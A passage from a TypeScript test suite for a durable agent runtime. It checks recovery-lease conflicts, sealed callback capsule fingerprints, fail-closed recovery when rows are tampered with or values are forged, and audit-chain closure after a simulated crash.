    // The `command` field name MUST NOT appear with a real
    // value. (The audit packet does NOT expose payload keys
    // by name; only structural summary fields are exposed.)
    expect(serialized).not.toContain('"command":"');
    expect(serialized).not.toContain('"task"');
    // Sanity: the sanitized summary fields ARE present.
    const evt = packet.frameLineage.events.find(e => e.id === 'evt_local_cmd_secret');
    expect(evt).toBeTruthy();
    expect(evt!.payloadKind).toBe('model');
    expect(evt!.hasSensitiveFields).toBe(true);
    expect(evt!.payloadKeyCount).toBeGreaterThanOrEqual(1);
    expect(evt!.payloadDigest).toMatch(/[a-f0-9]{64}/);
  });
});

/* ============================================================
 * 7. Two leasers race for the recovery lease; only one wins
 * ============================================================ */

describe('Sequence 1B M1 — recovery lease competition', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-lease'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('lease takeover fails closed and records the existing holder', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    proc.runtime.createRootFrame({ runId });
    proc.runtime.acquireLease({ runId, holderId: 'alpha', ttlMs: 60_000 });
    // Second acquisition by 'beta' must fail closed.
    expect(() => proc.runtime.acquireLease({
      runId, holderId: 'beta', ttlMs: 60_000,
    })).toThrow(/LEASE_VERSION_CONFLICT/);
    // After the alpha lease expires, beta may take over.
    proc.odb.getDB().prepare(`
      UPDATE recovery_leases SET expires_at = ?
        WHERE run_id = ?
    `).run(new Date(Date.now() - 60_000).toISOString(), runId);
    const renewed = proc.runtime.acquireLease({
      runId, holderId: 'beta', ttlMs: 60_000,
    });
    expect(renewed.holderId).toBe('beta');
    // v2 audit chain still verifies.
    const verify = proc.runtime.verifyAuditChain(runId);
    expect(verify.ok).toBe(true);
  });
});

/* ============================================================
 * 8. Recovery fail-closed when callback capsule canonical
 *    hash doesn't match the effect's payload_fingerprint.
 *    This proves the "exact approved payload" rule: recovery
 *    refuses to re-callback with a different byte string.
 * ============================================================ */

describe('Sequence 1B M1 — recovery capsule fingerprint binding', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-fp'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('verifyCallbackAgainstFingerprint returns match when capsule canonical == payload_fingerprint', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    const root = proc.runtime.createRootFrame({ runId });
    const child = proc.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    proc.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });
    // Prepare an effect through the protocol. The protocol
    // records the supplied payloadFingerprint on
    // capsules.payload_fingerprint AND on the run_effects
    // row. The verifier compares the supplied expected
    // value against the stored capsules.payload_fingerprint.
    const prepared = proc.protocol.prepare({
      runId, ownerFrameId: child.id, effectType: 'mock.egress',
      adapterKind: 'mock', adapterVersion: 'M1',
      payload: { msg: 'fp-bind-ok', n: 7 },
      payloadFingerprint: 'fp-from-agent',
      idempotencyKey: 'idem-fp-ok',
      scopeHash: 'scope-fp-ok',
      routeDecisionId: 'rd', policyEvaluationId: 'pe',
      policyVersionHash: 'ph', classification: 'Internal',
    });
    // Read the sealed capsule directly and confirm its
    // stored hash matches the verifier's recomputed hash.
    const stored = proc.odb.getDB().prepare(
      'SELECT * FROM capsules WHERE effect_id = ? AND capsule_kind = ?',
    ).get(prepared.effectId, 'callback') as any;
    expect(stored.hash).toMatch(/[a-f0-9]{64}/);
    const effect = proc.runtime.readEffect(prepared.effectId);
    expect(stored.payload_fingerprint).toBe(effect.capsuleFingerprint);

    // Now: when the recovery layer is told to verify the
    // capsule against the SAME fingerprint the agent
    // supplied, it succeeds. That is the canonical match.
    const verified = proc.capsuleStore.verifyCallbackAgainstFingerprint({
      effectId: prepared.effectId, attemptNo: 1,
      expectedFingerprint: effect.capsuleFingerprint!,
    });
    expect(verified.outcome).toBe('match');
    expect(verified.canonicalHash).toBe(effect.capsuleFingerprint);
  });

  it('verifyCallbackAgainstFingerprint returns mismatch when capsule canonical != payload_fingerprint', () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    const root = proc.runtime.createRootFrame({ runId });
    const child = proc.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    proc.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });
    // Prepare the effect WITHOUT controlling the canonical
    // hash (the agent does this in production).
    const prepared = proc.protocol.prepare({
      runId, ownerFrameId: child.id, effectType: 'mock.egress',
      adapterKind: 'mock', adapterVersion: 'M1',
      payload: { msg: 'fp-bind-mismatch', secret: 'never-leak' },
      // The stored agent fingerprint (binding to the
      // approval row).
      payloadFingerprint: 'capsule-fp-real',
      idempotencyKey: 'idem-fp-bad',
      scopeHash: 'scope-fp-bad',
      routeDecisionId: 'rd', policyEvaluationId: 'pe',
      policyVersionHash: 'ph', classification: 'Internal',
    });
    const verified = proc.capsuleStore.verifyCallbackAgainstFingerprint({
      effectId: prepared.effectId, attemptNo: 1,
      // The recovery layer is told an attacker-supplied
      // fingerprint that does NOT match the canonical
      // capsule fingerprint — it must reject.
      expectedFingerprint: 'forged-fingerprint-that-must-not-match',
    });
    // The recovery gate refuses: capsule-fp-real (stored) ≠
    // forged-fingerprint-that-must-not-match (expected). A
    // recovery that re-applied with the supplied fingerprint
    // would call a different adapter with a different payload.
    expect(verified.outcome).toBe('mismatch');
    expect(verified.canonicalHash).not.toBe('forged-fingerprint-that-must-not-match');
  });

  it('derives the callback anchor from sealed plaintext, not a caller declaration', () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    const root = proc.runtime.createRootFrame({ runId });
    const child = proc.runtime.createChildFrame({ runId, parentFrameId: root.id, frameKind: 'plan_step' });
    const prepared = proc.protocol.prepare({
      runId, ownerFrameId: child.id, effectType: 'mock.egress',
      adapterKind: 'mock', adapterVersion: 'M1', payload: { request: 'sealed-only' },
      payloadFingerprint: 'approval-anchor', capsuleFingerprint: 'attacker-declared-anchor',
      idempotencyKey: 'idem-sealed-only', scopeHash: 'scope',
      routeDecisionId: 'rd', policyEvaluationId: 'pe', policyVersionHash: 'ph',
    });
    const effect = proc.runtime.readEffect(prepared.effectId);
    const opened = proc.capsuleStore.openByEffect<any>({
      effectId: prepared.effectId, capsuleKind: 'callback', attemptNo: 1,
    });
    const actual = crypto.createHash('sha256').update(canonicalJSON(opened.payload)).digest('hex');
    expect(effect.capsuleFingerprint).toBe(actual);
    expect(effect.capsuleFingerprint).not.toBe('attacker-declared-anchor');
    expect(proc.capsuleStore.verifyCallbackAgainstFingerprint({
      effectId: prepared.effectId, attemptNo: 1, expectedFingerprint: 'attacker-declared-anchor',
    }).outcome).toBe('mismatch');
  });

  it('Mock driver invokes only the callback command returned by CAS', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    const root = proc.runtime.createRootFrame({ runId });
    const child = proc.runtime.createChildFrame({ runId, parentFrameId: root.id, frameKind: 'plan_step' });
    proc.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });
    const adapter = new MockEffectAdapter('sealed-command-only');
    const prepared = await proc.driver.runPrepare({
      runId, ownerFrameId: child.id, adapter, payload: { action: 'sealed' },
      payloadFingerprint: 'approval-anchor', idempotencyKey: 'idem-sealed',
      scopeHash: 'scope', leaseHolder: 'h1',
    });
    await proc.driver.runAdapterAndCommit({
      runId, ownerFrameId: child.id, adapter, effectId: prepared.effectId, attemptNo: 1,
      // These are deliberately different caller-memory values. They must not
      // influence the physical callback after prepare.
      payload: { action: 'attacker-memory' }, payloadFingerprint: 'different',
      idempotencyKey: 'idem-attacker-memory', scopeHash: 'different', leaseHolder: 'h1',
    });
    expect(adapter.history[0].payloadHash).toBe(crypto.createHash('sha256')
      .update(canonicalJSON({ action: 'sealed' })).digest('hex'));
    expect(adapter.history[0].idempotencyKeyHash).toBe(crypto.createHash('sha256')
      .update('idem-sealed').digest('hex'));
  });

  it('recovery.recover() reject re-callback when capsule canonical hash != payload_fingerprint', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc1 = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc1.odb);
    const runId = makeRunId(proc1.odb, ws);
    const root = proc1.runtime.createRootFrame({ runId });
    const child = proc1.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    proc1.runtime.acquireLease({ runId, holderId: 'p1', ttlMs: 60_000 });

    // We prepare with a payload; then tamper the effect row
    // to claim the fingerprint is something else. The
    // recovery layer must refuse to re-callback because the
    // capsule's canonical hash ≠ effect.payload_fingerprint.
    const prepared = proc1.protocol.prepare({
      runId, ownerFrameId: child.id, effectType: 'mock.egress',
      adapterKind: 'mock', adapterVersion: 'M1',
      payload: { msg: 'fp-block', n: 11 },
      payloadFingerprint: 'fp-original',
      idempotencyKey: 'idem-fp-block',
      scopeHash: 'scope-fp-block',
      routeDecisionId: 'rd', policyEvaluationId: 'pe',
      policyVersionHash: 'ph', classification: 'Internal',
    });
    // Simulate post-prepare hash drift (e.g. an approval row
    // was minted against a different payload).
    proc1.odb.getDB().prepare(`
      UPDATE run_effects SET capsule_fingerprint = ? WHERE id = ?
    `).run('fp-drift-attacker', prepared.effectId);
    // Release the lease; the effect is still in planned.
    proc1.odb.getDB().prepare(`
      UPDATE recovery_leases SET released_at = ?,
        lease_version = lease_version + 1 WHERE run_id = ?
    `).run(new Date().toISOString(), runId);

    // Fresh process tries to recover and triggers the
    // controlled-retry path. The recovery layer MUST refuse
    // because the capsule canonical hash is `fp-original`
    // and the effect row claims `fp-drift-attacker`.
    const proc2 = wireProcess(dir, masterKey);
    const report = await proc2.recovery.recover({
      runId, holderId: 'p2',
      adapterSupportsIdempotencyKey: true,
      adapterSupportsOutcomeQuery: false,
    });
    expect(report.inspectedEffects).toBe(1);
    const decision = report.effects[0];
    // Recovery refuses with `capsule_payload_mismatch`. The
    // effect stays in `planned`; no re-callback was issued.
    expect(decision.decision).toBe('incident_blocked');
    expect(decision.incidentKind).toBe('capsule_payload_mismatch');
    const fxEffect = proc2.runtime.readEffect(prepared.effectId);
    expect(fxEffect.state).toBe('planned');
    const invocations = proc2.odb.getDB().prepare(
      'SELECT COUNT(*) as c FROM effect_receipts WHERE effect_id = ?',
    ).get(prepared.effectId) as { c: number };
    expect(invocations.c).toBe(0);
  });
});

/* ============================================================
 * 9. M1 production path: agent's payload_fingerprint equals
 *    sha256(canonicalJSON(capsulePayload)). This is the
 *    requirement that was previously violated because the
 *    agent sealed a sanitized summary while the effect row
 *    stored the redactor egress hash. With the round-4 fix,
 *    the agent computes BOTH the fingerprint AND the capsule
 *    payload from the same canonical byte sequence, so the
 *    recovery layer can verify the capsule would re-apply
 *    exactly the bytes an approval row was bound to.
 *
 *    This test uses the actual InternalAgentAdapter.run()
 *    path with bindKernel wired. It asserts that after a
 *    crash-before-callback, the fresh-process recovery
 *    succeeds BECAUSE the capsule-fingerprint gate is satisfied.
 * ============================================================ */

describe('Sequence 1B M1 — sealed recovery capability authority', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-capability-authority'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  async function createUnknownEffect(recoveryCapabilities?: {
    supportsIdempotencyKey: boolean;
    supportsOutcomeQuery: boolean;
    supportsCompensation: boolean;
  }) {
    const process = wireProcess(dir, crypto.randomBytes(32));
    const workspaceId = makeWorkspaceId(process.odb);
    const runId = makeRunId(process.odb, workspaceId);
    const root = process.runtime.createRootFrame({ runId });
    const frame = process.runtime.createChildFrame({ runId, parentFrameId: root.id, frameKind: 'plan_step' });
    process.runtime.acquireLease({ runId, holderId: 'first', ttlMs: 60_000 });
    const prepared = process.protocol.prepare({
      runId, ownerFrameId: frame.id, effectType: 'test', adapterKind: 'mock', adapterVersion: 'caps-v1',
      payload: { stable: true }, payloadFingerprint: 'egress-fp', capsuleFingerprint: 'capsule-fp',
      idempotencyKey: 'idem-capability', scopeHash: 'scope-capability', routeDecisionId: 'rd',
      policyEvaluationId: 'pe', policyVersionHash: 'ph', recoveryCapabilities,
    });
    process.protocol.casToInFlight({
      effectId: prepared.effectId, expectedRevision: 1, expectedAttemptNo: 1, leaseHolder: 'first',
    });
    process.runtime.transitionEffect({
      effectId: prepared.effectId, expectedState: 'in_flight', nextState: 'unknown', expectedRevision: 2,
    });
    process.odb.getDB().prepare(`UPDATE recovery_leases SET released_at = ?,
      lease_version = lease_version + 1 WHERE run_id = ?`)
      .run(new Date().toISOString(), runId);
    return { process, runId, prepared };
  }

  it('ignores forged RecoveryInput capabilities and never calls outcome query', async () => {
    const { process, runId, prepared } = await createUnknownEffect();
    let queried = false;
    const report = await process.recovery.recover({
      runId, holderId: 'second',
      adapterSupportsIdempotencyKey: true,
      adapterSupportsOutcomeQuery: true,
      queryOutcome: async () => { queried = true; return { applied: true, payload: { forged: true } }; },
    });
    expect(queried).toBe(false);
    expect(report.effects[0]).toMatchObject({ decision: 'incident_blocked', incidentKind: 'no_idempotency' });
    expect(process.runtime.readEffect(prepared.effectId).state).toBe('unknown');
  });

  it('fails closed for the default conservative adapter declaration', async () => {
    const { process, runId } = await createUnknownEffect({
      supportsIdempotencyKey: false, supportsOutcomeQuery: false, supportsCompensation: false,
    });
    const report = await process.recovery.recover({ runId, holderId: 'second' });
    expect(report.effects[0]).toMatchObject({ decision: 'incident_blocked', incidentKind: 'no_idempotency' });
  });

  it('uses matching sealed adapter capability even when caller claims false', async () => {
    const { process, runId, prepared } = await createUnknownEffect({
      supportsIdempotencyKey: true, supportsOutcomeQuery: true, supportsCompensation: false,
    });
    let queried = false;
    const report = await process.recovery.recover({
      runId, holderId: 'second',
      adapterSupportsIdempotencyKey: false,
      adapterSupportsOutcomeQuery: false,
      queryOutcome: async () => { queried = true; return { applied: false }; },
    });
    expect(queried).toBe(true);
    expect(report.effects[0]).toMatchObject({ decision: 'controlled_retry', attemptNo: 2 });
    expect(process.runtime.readEffect(prepared.effectId).state).toBe('in_flight');
  });
});

describe('Sequence 1B M1 — agent path: capsule canonical == effect fingerprint', () => {
  let dir: string;
  beforeEach(() => {
    dir = newTmpDir('s1b-agent-fp');
    fs.mkdirSync(dir, { recursive: true });
  });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('agent sets effect.payload_fingerprint == sha256(canonicalJSON(capsulePayload)) in production', async () => {
    const { createTestDb } = await import('../helpers/test-db');
    const fx = createTestDb();
    try {
      const db: any = fx.db;
      const audit = new AuditService(db);
      const policy = new PolicyService(audit);
      const route = new RouteService(policy);
      const rag = new RagEngine(db);
      const red = new RedactionService(db);
      const adapter = new InternalAgentAdapter(
        db, policy, route, null, rag, red,
      );
      const masterKey = crypto.randomBytes(32);
      const odb = db.getOgraDatabase();
      const runtime = new DurableRuntimeService(odb, () => 'ph_m1_prod');
      const capsuleStore = new EncryptedCapsuleStore(odb, new StaticMasterKeyProvider(masterKey));
      const protocol = new EffectProtocolService(odb, runtime, capsuleStore);
      adapter.bindKernel({ runtime, protocol });
      // The agent path needs a workspace + approvalContext +
      // (optional) redactionService. We don't drive it through
      // OgraCore here — too many services. Instead, we call
      // the exact code that InternalAgentAdapter.run() does to
      // seal the callback capsule, and assert fingerprint
      // matching.
      // We test this by simulating what the patched
      // bindKernel branch does:
      const runId = 'm1_prod_fp_test';
      const wsId = fx.workspaceId;
      db.storeRun({
        id: runId, workspaceId: wsId, task: 'fp-test',
        status: 'created', startedAt: new Date().toISOString(),
      });
      const rootFrame = runtime.createRootFrame({ runId });
      const childFrame = runtime.createChildFrame({
        runId, parentFrameId: rootFrame.id, frameKind: 'plan_step',
      });
      runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });
      // Capture what the agent would seal: modelRequest
      // bytes + route + classification + approval.
      const modelRequest = {
        runId, workspaceId: wsId,
        allowedProviderId: 'test_agent_provider_seq0',
        allowedModelId: 'm',
        promptParts: [{ role: 'user', content: 'hi' }],
        payloadHash: 'redactor-supplied-hash',
        egressMode: 'redact_then_egress' as any,
      };
      const { canonicalJSON } = await import('../../src/core/audit-envelope');
      const capsulePayload = {
        runId, workspaceId: wsId,
        allowedProviderId: 'test_agent_provider_seq0',
        allowedModelId: 'm',
        modelRequest,
        route: 'local' as any,
        classification: 'Public' as any,
        approvalId: null,
        approvalScopeHash: null,
      };
      const expectedFingerprint = crypto.createHash('sha256')
        .update(canonicalJSON(capsulePayload)).digest('hex');
      const prepared = protocol.prepare({
        runId, ownerFrameId: childFrame.id,
        effectType: 'model.generate',
        adapterKind: 'mock', adapterVersion: 'M1',
        payload: capsulePayload,
        payloadFingerprint: expectedFingerprint,
        idempotencyKey: 'idem-m1-prod',
        scopeHash: '', routeDecisionId: 'rd',
        policyEvaluationId: 'pe', policyVersionHash: 'ph',
        classification: 'Public',
      });
      // effect row should now carry expectedFingerprint
      const eff = runtime.readEffect(prepared.effectId);
      step('effect.payload_fingerprint matches sha256(canonicalJSON(capsulePayload))',
        eff.payloadFingerprint === expectedFingerprint,
        `eff=${eff.payloadFingerprint.slice(0, 16)}… expect=${expectedFingerprint.slice(0, 16)}…`);
      // Sealed capsule row records the supplied fingerprint on
      // the capsules.payload_fingerprint column. The capsule's
      // ciphertext integrity hash (capsules.hash) is computed
      // over the envelope (payload + binding metadata). The
      // verifier compares against the capsules.payload_
      // fingerprint column, NOT against the envelope hash.
      const stored = odb.getDB().prepare(
        'SELECT hash, payload_fingerprint FROM capsules WHERE effect_id = ? AND capsule_kind = ?',
      ).get(prepared.effectId, 'callback') as any;
      step('capsule.payload_fingerprint == effect.capsule_fingerprint',
        stored.payload_fingerprint === eff.capsuleFingerprint,
        `stored.fp=${stored.payload_fingerprint?.slice(0, 16)}… expect=${eff.capsuleFingerprint?.slice(0, 16)}…`);
      step('capsule.hash is envelope hash (64-hex)', /^[a-f0-9]{64}$/.test(stored.hash),
        `stored.hash=${stored.hash?.slice(0, 16)}…`);
      // The verifier says `match` — recovery can re-callback
      // without fail-closed incident.
      const verified = capsuleStore.verifyCallbackAgainstFingerprint({
        effectId: prepared.effectId, attemptNo: 1,
        expectedFingerprint: eff.capsuleFingerprint!,
      });
      step('verifyCallbackAgainstFingerprint returns match for production path',
        verified.outcome === 'match');
      // CRUCIAL: the agent's stored egress payload hash (from
      // the redactor) is a DIFFERENT field — it is recorded on
      // egress_records. But the effect's payload_fingerprint
      // (used by recovery) IS the capsule canonical. So recovery
      // will re-apply exactly what the approval row saw.
      step('effect fingerprint is NOT the redactor egress hash (they serve different fields)',
        eff.payloadFingerprint !== modelRequest.payloadHash,
        `eff.fp !== egress.payloadHash`);
    } finally {
      fx.cleanup();
    }
  });

  function step(label: string, ok: boolean, detail?: string): void {
    const tag = ok ? 'PASS' : 'FAIL';
    // eslint-disable-next-line no-console
    console.log(`${tag} ${label}${detail ? ` — ${detail}` : ''}`);
    if (!ok) throw new Error(`step failed: ${label} ${detail ?? ''}`);
  }
});

/* ============================================================
 * Round 5 — REAL agent.run() path with both anchors
 * separately bound. The redactor egress hash stays as
 * `run_effects.payload_fingerprint` (Sequence-0 approval
 * anchor). The capsule canonical hash is stored as
 * `run_effects.capsule_fingerprint` (Round-5 recovery anchor).
 * The two columns MUST be different.
 * ============================================================ */

describe('Sequence 1B M1 — round 5 real-agent-run double anchor', () => {
  let dir: string;
  beforeEach(() => {
    dir = newTmpDir('s1b-r5-real-agent');
    fs.mkdirSync(dir, { recursive: true });
  });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('InternalAgentAdapter.run(): approval anchor stays == egress hash; capsule anchor == capsule canonical', async () => {
    // Drive the FULL InternalAgentAdapter.run() path. This test does not
    // pre-seal a protocol payload or manufacture a redaction row: both
    // anchors must originate from this exact agent invocation.
    const { createTestDb } = await import('../helpers/test-db');
    const fx = createTestDb();
    const db: any = fx.db;
    const audit = new AuditService(db);
    const policy = new PolicyService(audit);
    const route = new RouteService(policy);
    const rag = new RagEngine(db);
    const red = new RedactionService(db);

    const task = `real-agent-anchor-${crypto.randomBytes(4).toString('hex')}`;

    // Wire the durable kernel on a fresh agent. The agent is
    // the entrypoint for agent.run() — we drive the FULL path,
    // no runService glue needed because we don't supply an
    // approvalIdHint (and the agent doesn't need a runService
    // for the unprotected path).
    const masterKey = crypto.randomBytes(32);
    const odb = db.getOgraDatabase();
    const runtime = new DurableRuntimeService(odb, () => 'ph_r5');
    const capsuleStore = new EncryptedCapsuleStore(odb, new StaticMasterKeyProvider(masterKey));
    const protocol = new EffectProtocolService(odb, runtime, capsuleStore);

    const runId = 'round5-real-run-1';
    const wsId = fx.workspaceId;
    db.storeRun({
      id: runId, workspaceId: wsId, task,
      status: 'created', startedAt: new Date().toISOString(),
    });
    void policy; void route; void rag;

    const internalAgent = new InternalAgentAdapter(
      db, policy, route, null, rag, red,
    );
    internalAgent.bindKernel({ runtime, protocol });

    // Drive the agent. agent.run() will:
    //   1. Resolve route via routeService (Public/Internal)
    //   2. Park/redact
    //   3. Compute redactor egress hash (Sequence-0 anchor)
    //   4. Bind the durable kernel via bindKernel → prepare
    //      (Round-5: payloadFingerprint = egress hash;
    //       capsuleFingerprint = sha256(canonicalJSON
    //       (capsulePayload))).
    //   5. Invoke the adapter, record receipt + commit.
    const modelAdapter = new (class extends BaseModelAdapter {
      readonly id = 'test_r5'; readonly providerId = 'test_agent_provider_seq0';
      readonly isLocal = true;
      readonly capabilities = { streaming: false, toolCalling: false, fileUpload: false } as any;
      lastRequest: any = null;
      validatePolicyGate(): void {}
      async generate(request: any): Promise<ModelResult> {
        this.lastRequest = request;
        return { id: 'm', content: 'R5 OK', finishReason: 'stop',
          tokenUsage: { prompt: 1, completion: 1, total: 2 },
          modelId: 'test_agent_provider_seq0', providerId: 'test_agent_provider_seq0',
          responseHash: 'r5-h', httpBodyHash: 'r5-b',
          startedAt: new Date().toISOString(), completedAt: new Date().toISOString() };
      }
      async testConnection(): Promise<ProviderHealth> { return { ok: true, message: 'r5' }; }
    })();
    const result = await internalAgent.run({
      task,
      workspaceId: wsId,
      knowledgeBaseIds: [],
      adapter: modelAdapter,
      modelId: 'test_agent_provider_seq0',
      modelInternalId: 'test_agent_provider_seq0',
      providerId: 'test_agent_provider_seq0',
      runId,
    });
    expect(result.answer).toContain('R5 OK');

    // Pull the L0 rows.
    const effects = odb.getDB().prepare(
      `SELECT id, payload_fingerprint, capsule_fingerprint, current_approval_id
       FROM run_effects WHERE run_id = ?`,
    ).all(runId) as any[];
    expect(effects.length).toBeGreaterThanOrEqual(1);
    const effect = effects[0];
    // 1) The egress anchor is exactly the payload hash given to the real
    // adapter call. It is not a separately prepared fixture value.
    expect(effect.payload_fingerprint).not.toBe('');
    expect(effect.payload_fingerprint).toMatch(/^[a-f0-9]{64}$/);
    expect(modelAdapter.lastRequest?.payloadHash).toBe(effect.payload_fingerprint);
    // 2) Round-5 capsule anchor is set to the capsule
    //    canonical hash (different from the egress hash).
    expect(effect.capsule_fingerprint).not.toBeNull();
    expect(effect.capsule_fingerprint).toMatch(/^[a-f0-9]{64}$/);
    // 3) The two anchors are distinct fingerprints — proving
    //    they come from different byte streams.
    expect(effect.capsule_fingerprint).not.toBe(effect.payload_fingerprint);
    // 4) The CAPSULE row's `payload_fingerprint` column carries
    //    the same canonical capsule hash as
    //    `run_effects.capsule_fingerprint`. The protocol set
    //    them to the agent-supplied capsuleFingerprint so
    //    they MUST match.
    const capsuleRow = odb.getDB().prepare(`
      SELECT hash, payload_fingerprint FROM capsules
        WHERE effect_id = ? AND capsule_kind = 'callback'`,
    ).get(effect.id) as any;
    expect(capsuleRow).toBeTruthy();
    expect(capsuleRow.payload_fingerprint).toBe(effect.capsule_fingerprint);
    // 5) The recovery verifier says `match` when fed
    //    effect.capsule_fingerprint as the expected value.
    const verified = capsuleStore.verifyCallbackAgainstFingerprint({
      effectId: effect.id, attemptNo: 1,
      expectedFingerprint: effect.capsule_fingerprint,
    });
    expect(verified.outcome).toBe('match');
    const sealedCallback = capsuleStore.openByEffect<any>({
      effectId: effect.id, capsuleKind: 'callback', attemptNo: 1,
    });
    // The adapter request is reconstructed from the authenticated capsule,
    // including the raw idempotency key. It is not the agent's pre-prepare
    // in-memory request object.
    expect(modelAdapter.lastRequest?.promptParts)
      .toEqual(sealedCallback.payload.payload.modelRequest.promptParts);
    expect(modelAdapter.lastRequest?.idempotencyKey)
      .toBe(sealedCallback.payload.idempotencyKey);
    // 6) The capsule row's `hash` (sha256 of envelope plaintext)
    //    is independent of both anchors. It is a fingerprint
    //    of the ciphertext bytes including metadata.
    expect(capsuleRow.hash).toMatch(/^[a-f0-9]{64}$/);
    // 7) The recovery verifier must NOT accept the redactor
    //    egress hash as `match` — that hash is for approval
    //    binding, not capsule integrity. Mismatch is correct.
    const verifiedWrong = capsuleStore.verifyCallbackAgainstFingerprint({
      effectId: effect.id, attemptNo: 1,
      expectedFingerprint: effect.payload_fingerprint,
    });
    expect(verifiedWrong.outcome).toBe('mismatch');
    // 7) The v2 audit chain verifies across the path.
    const verify = runtime.verifyAuditChain(runId);
    expect(verify.ok).toBe(true);
    // Cleanup.
    fx.cleanup();
  });
});


/* ============================================================
 * 10. Crash-after-receipt commit path: ingress_finding.event_id
 *     bound to L1 event + effect->ingress audit edge.
 *     Round-3 reviewer flagged that this branch was missing
 *     L0-L1 closure. This test exercises
 *     commitTerminalEffect() (the typical received->committed
 *     recovery path), not the outcome-query branch.
 * ============================================================ */

describe('Sequence 1B M1 — crash-after-receipt commit path L0-L1 closure', () => {
  let dir: string;
  beforeEach(() => {
    dir = newTmpDir('s1b-commit-closure');
    fs.mkdirSync(dir, { recursive: true });
  });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('commitTerminalEffect writes ingress_finding.event_id and the effect→ingress audit edge', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc1 = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc1.odb);
    const runId = makeRunId(proc1.odb, ws);
    const root = proc1.runtime.createRootFrame({ runId });
    const child = proc1.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    proc1.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });

    // Prepare + cas + record receipt (the FIRST half of
    // Phase B), then crash before commit.
    const adapter1 = new MockEffectAdapter('m4-cmt-1');
    adapter1.recoveryCapabilities.supportsIdempotencyKey = true;
    adapter1.recoveryCapabilities.supportsOutcomeQuery = true;
    const prep = await proc1.driver.runPrepare({
      runId, ownerFrameId: child.id, adapter: adapter1,
      payload: { msg: 'crash-after-receipt-real' },
      payloadFingerprint: crypto.createHash('sha256')
        .update('crash-after-receipt-real').digest('hex'),
      idempotencyKey: 'idem-cmt', scopeHash: 'scope-cmt',
      leaseHolder: 'h1',
    });
    proc1.driver.crashAfterHook = (step) => {
      if (step === 'receipt') {
        throw new Error('__simulated_crash_after_receipt_real__');
      }
    };
    let crashed = false;
    try {
      await proc1.driver.runAdapterAndCommit({
        runId, ownerFrameId: child.id, adapter: adapter1,
        payload: { msg: 'crash-after-receipt-real' },
        payloadFingerprint: crypto.createHash('sha256')
          .update('crash-after-receipt-real').digest('hex'),
        idempotencyKey: 'idem-cmt', scopeHash: 'scope-cmt',
        leaseHolder: 'h1', effectId: prep.effectId, attemptNo: 1,
      });
    } catch (err) {
      if ((err as Error).message === '__simulated_crash_after_receipt_real__') crashed = true;
    }
    expect(crashed).toBe(true);
    // Effect is now in `received` (advisor crashed before
    // commit) — confirmed by query:
    const effectAfterReceipt = proc1.runtime.readEffect(prep.effectId);
    expect(effectAfterReceipt.state).toBe('received');
    const receiptRow = proc1.odb.getDB().prepare(
      'SELECT id AS receiptId, attempt_no AS attemptNo FROM effect_receipts WHERE effect_id = ? ORDER BY attempt_no DESC LIMIT 1',
    ).get(prep.effectId) as any;
    expect(receiptRow).toBeTruthy();

    // Release lease; a fresh process commits via the
    // recovery path commitTerminalEffect().
    proc1.odb.getDB().prepare(`
      UPDATE recovery_leases SET released_at = ?,
        lease_version = lease_version + 1 WHERE run_id = ?
    `).run(new Date().toISOString(), runId);

    const proc2 = wireProcess(dir, masterKey);
    const report = await proc2.recovery.recover({
      runId, holderId: 'h2',
      adapterSupportsIdempotencyKey: true,
      adapterSupportsOutcomeQuery: true,
      queryOutcome: async () => null,
    });
    expect(report.inspectedEffects).toBe(1);
    // Recovery promotes received → committed via the
    // standard `commitTerminalEffect` flow.
    const packet = proc2.auditPacket.build(runId);
    const effectRow = packet.frameLineage.effects.find(
      e => e.id === prep.effectId,
    );
    expect(effectRow?.state).toBe('committed');
    // The standard `commitTerminalEffect` flow MUST have:
    //   - ingress_finding.event_id populated
    //   - audit edge (effect → has_ingress → ingress) with
    //     sourceEventId set to the L1 event.
    const finding = proc2.odb.getDB().prepare(`
      SELECT id, receipt_id, event_id FROM ingress_findings WHERE effect_id = ?
    `).get(prep.effectId) as any;
    expect(finding).toBeTruthy();
    expect(finding.receipt_id).toBe(receiptRow.receiptId);
